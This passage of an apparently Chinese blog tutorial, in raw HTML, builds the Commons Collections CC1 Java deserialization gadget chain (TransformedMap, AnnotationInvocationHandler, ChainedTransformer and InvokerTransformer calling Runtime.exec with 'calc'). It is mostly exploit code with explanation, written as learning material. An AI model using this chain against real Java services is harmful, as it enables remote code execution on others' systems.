class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造transformedmap是调用tranform()的前置条件</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet()) &#123;   <span class="comment">//遍历Map常用格式</span></span><br><span class="line">            <span class="comment">//调用setValue方法，通过setValue去触发checkSetValue()</span></span><br><span class="line">            entry.setValue(runtime);      </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>梳理一遍过程：</p><p>首先，我们找到了TransformedMap这个类，我们想要调用其中的checkSetValue方法，但是这个类的构造器是peotected权限，只能类中访问，所以我们调用decorate方法来实例化这个类，</p><p>在此之前我们先实例化了一个HashMap,并且调用了put方法给他赋了一个键值对(这里是为了让我们再后边的遍历中调用setValue()提供前置条件)，然后把这个map当成参数传入，实例化成了一个transformedmap对象，这个对象也是Map类型的，</p><p>然后我们对这个对象进行遍历，在遍历过程中我们可以调用setValue方法，而恰好又遇到了一个重写了setValue的父类，这个重写的方法刚好调用了checkSetValue方法，这样就形成了一个闭环</p><p>下面就是找到一个readObject中调用了setValue这个方法：找到了AnnotationInvocationHandler这个类中的readObject调用了该方法如下代码所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可以找到该类的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到memberValue是可控的是可以由构造方法直接传入的。所以接下来我们可以着手构造一下该链，但是在写的时候由于该类是java的内部类所以需要反射来调用如下代码所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义反序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造transformedmap是调用tranform()的前置条件</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取sun.reflect.annotation.AnnotationInvocationHandler类的Class对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>反序列化时运行报错这是为什么:</p><p>问题1：</p><p><a href="https://xz.aliyun.com/t/7031?time__1311=n4%2BxnD0GDti%3DLxQTq05%2BbDyCbdbd4YvjPx&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12715%3Ftime__1311%3DmqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com%252F#toc-7">https://xz.aliyun.com/t/7031?time__1311=n4%2BxnD0GDti%3DLxQTq05%2BbDyCbdbd4YvjPx&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12715%3Ftime__1311%3DmqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com%252F#toc-7</a></p><p>通过查看Runtime类发现没有实现serializable是不可序列化的所以需要通过反射来进行构造</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714491023957-6fd90bbe-7cf0-428e-b273-33c398566325.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class rc=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);                 <span class="comment">//获取类原型</span></span><br><span class="line">        Method getRuntime= rc.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);    <span class="comment">//获取getRuntime方法，</span></span><br><span class="line">        Runtime r=(Runtime) getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);    <span class="comment">//获取实例化对象，因为该方法为无参方法，所以全为null</span></span><br><span class="line">        Method exec=rc.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);        <span class="comment">//获取exec方法</span></span><br><span class="line">        exec.invoke(r,<span class="string">&quot;calc&quot;</span>); </span><br></pre></td></tr></table></figure><p>我们需要将其改造成InvokerTransformer的形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">         <span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//这里模拟获取invoke方法</span></span><br><span class="line"> <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">         <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntime);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">//这里模拟获取exec方法，并进行命令执行</span></span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br></pre></td></tr></table></figure><p>在这里解释下为什么需要获取getMethod方法而不是直接获取getRuntime，因为我们传入的是Runtime.class对象在InvokerTransformer类中的transform方法会在获取其class，所以就变成java.lang.class对象了，这个类是不存在getRuntime方法的所以需要先反射获取getMethod方法，在通过invoke传入的Runtime.class对象，获得其getruntime方法因为此时获取的method对象所以还需要在反射调用invoke来将getruntime的实例获取出。此处具体参考<a href="https://xz.aliyun.com/t/7031?time__1311=n4%2BxnD0GDti%3DLxQTq05%2BbDyCbdbd4YvjPx&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12715%3Ftime__1311%3DmqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com%252F#toc-7">https://xz.aliyun.com/t/7031?time__1311=n4%2BxnD0GDti%3DLxQTq05%2BbDyCbdbd4YvjPx&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12715%3Ftime__1311%3DmqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com%252F#toc-7</a></p><h4 id="对于runtime反射获取改成InvokerTransformer形式的解释：">对于runtime反射获取改成InvokerTransformer形式的解释：</h4><p><font style="color:rgb(51, 51, 51);">既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例呗？<br></font>我们知道Runtime的实例是通过Runtime.getRuntime()来获取的，而InvokerTransformer<font style="color:rgb(51, 51, 51);">里面的反射机制可以执行任意函数。<br></font>同时，我们已经成功执行过Runtime类里面的exec函数。讲道理肯定是没问题的.</p><p>我们先看getRuntiime方法的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有参数，那就非常简单了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//得到Runtime class</span></span><br><span class="line">    <span class="comment">//由于InvokerTransformer的构造函数要求传入Class类型的参数类型，和Object类型的参数数值，所以封装一下，下面也一样</span></span><br><span class="line">    <span class="comment">//上面传入Runtime.class，调用Runtime class的getRuntime方法（由于是一个静态方法，invoke调用静态方法，传入类即可）</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;),</span><br><span class="line">    <span class="comment">//上面Runtime.getRuntime()得到了实例，作为这边的输入(invoke调用普通方法，需要传入类的实例)     </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p><font style="color:rgb(119, 119, 119);">在这里，之前自己陷入了一个很傻逼的问题，即：InvokerTransformer类transform方法中return method.invoke()这个语句<br></font><font style="color:rgb(119, 119, 119);">invoke()调用到底return了啥?<br></font><font style="color:rgb(119, 119, 119);">因为在这里形成了一个调用return的结果，再调用的链。为什么就可以上一个输出作为下一个输入时，可以成功调用了呢？<br></font><font style="color:rgb(119, 119, 119);">一开始以为invoke会统一返回一个对象作为下一个输入什么的，并且在调试的时候每次invoke的结果都不一样，源码看的头晕。<br></font><font style="color:rgb(119, 119, 119);">实际上是钻了死胡同：invoke的return是根据被调用的函数return啥，invoke就return啥。<br></font><font style="color:rgb(119, 119, 119);">就好比我invoke一个我自定义的方法a，在a中，我return了字符串&quot;1&quot;。那么就是invoke的结果就是字符串&quot;1&quot;。<br></font>看以上的过程就是第一次Runtime.getRuntime()的结果输入了下一个InvokerTransformer</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714491785599-c0467126-1b38-443b-b3c4-b0c79d7f1e12.png" alt=""></p><p>以上感觉是万事大吉了！但是实际上并不是…</p><p>回想之前对于InvokerTransformer中Class cls = input.getClass();的解释</p><p>这里我们需要注意到input.getClass()这个方法使用上的一些区别：</p><ul><li>当input是一个类的实例对象时，获取到的是这个类</li><li>当input是一个类时，获取到的是java.lang.Class</li></ul><p>我们来推演第一次InvokerTransformer的反射调用，即得到Runtime类对象的getRuntime方法调用:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InvokeTransformer关键语句：</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;<span class="comment">//input为我们设置的常量Runtime.class</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//！！！这里由于input是一个类，会得到java.lang.Class</span></span><br><span class="line"><span class="comment">//在java.lang.Class类中去寻找getRuntime方法企图得到Runtime类对象，此处报错！！</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">那么我们好像陷入了一个死胡同：<br></font><font style="color:rgb(51, 51, 51);">得到Runtime类实例才能调用exec方法。<br></font>而得到Runtime类实例作为input，才能得到Runtime class，才能找到getRuntime方法，得到Runtime类实例…</p><p>第二点九步 还是反射机制</p><p>那么我们通过直接调用Runtime.getRuntime方法好像是行不通了,有没有其他方法呢？</p><p><strong>还是反射机制</strong></p><p>已知：</p><ol><li>我们开头不能获得Class.forName(“java.lang.Runtime”)，只能得到Class.forName(“java.lang.Class”)</li><li><font style="color:rgb(51, 51, 51);">我们可以有任意的反射机制<br></font>求：</li><li><font style="color:rgb(51, 51, 51);">我们要获取到Runtime.getRunime函数，并执行它。<br></font>解：</li><li>通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制</li><li>通过getMethod函数获取Runtime类中的getRuntime函数<ul><li>在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的</li></ul></li><li>再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数</li><li>invoke调用getRuntime函数，获取Runtime类的实例<ul><li>这里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类</li></ul></li></ol><p>具体变化细节，我选择把它放在反射机制一文中说明，这边给出结果。</p><p><font style="color:rgb(51, 51, 51);">我们的最终目的是执行<br></font>Class.forName(“java.lang.Runtime”).getMethod(“getRuntime”).invoke(Class.forName(“java.lang.Runtime”)</p><p>先来获取getRuntime类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//目标语句</span></span><br><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>)</span><br><span class="line"><span class="comment">//使用java.lang.Class开头</span></span><br><span class="line">Class.forName(<span class="string">&quot;java.lang.Class&quot;</span>).getMethod(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;)</span><br><span class="line">.invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>),<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//invoke函数的第一个参数是Runtime类，我们需要在Runtime类中去执行getMethod，获取getRuntime参数</span></span><br></pre></td></tr></table></figure><p>对照着InvokerTransformer类转变为transformers格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//cls = java.lang.Class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes); <span class="comment">//getMethod方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs); <span class="comment">//在Runtime中找getRuntime方法，并返回这个方法</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="comment">//还需要填充 调用getRuntime得到Runtime实例,</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还差执行获取到的getRuntime，下一个input是上一个执行接口，继续对照</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input=getRuntime这个方法</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//cls = java.lang.Method（getRuntime方法是method类）</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes); <span class="comment">//在method类中找到invoke方法，method=invoke方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs); <span class="comment">//调用invoke方法，input=getRuntime这个方法，传入自定义的参数</span></span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">以上最后一步有点复杂，method就是invoke方法，相当于使用invoke调用了invoke函数。<br></font>首先this.iMethodName, this.iParamTypes是根据invoke接口而定的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj, Object... args)</span></span><br><span class="line"><span class="comment">//this.iMethodName=&quot;invoke&quot;</span></span><br><span class="line"><span class="comment">//this.iParamTypes=new Class[] &#123;Object.class, Object[].class &#125;</span></span><br><span class="line"><span class="comment">//外面class、Object封装是InvokerTransformer类的构造函数要求</span></span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">按照invoke中的input才是它要调用的环境的准则。<br></font>invoke方法.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)<font style="color:rgb(51, 51, 51);">，<br></font>而input=getRuntime方法，那么只要填入this.iArgs就好了</p><p><font style="color:rgb(51, 51, 51);">又由于getRuntime是个静态函数，不用太纠结输入obj，写作null。getRuntime方法不需要参数。<br></font>this.iArgs=null,new Object[0]</p><p>那么整合就如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 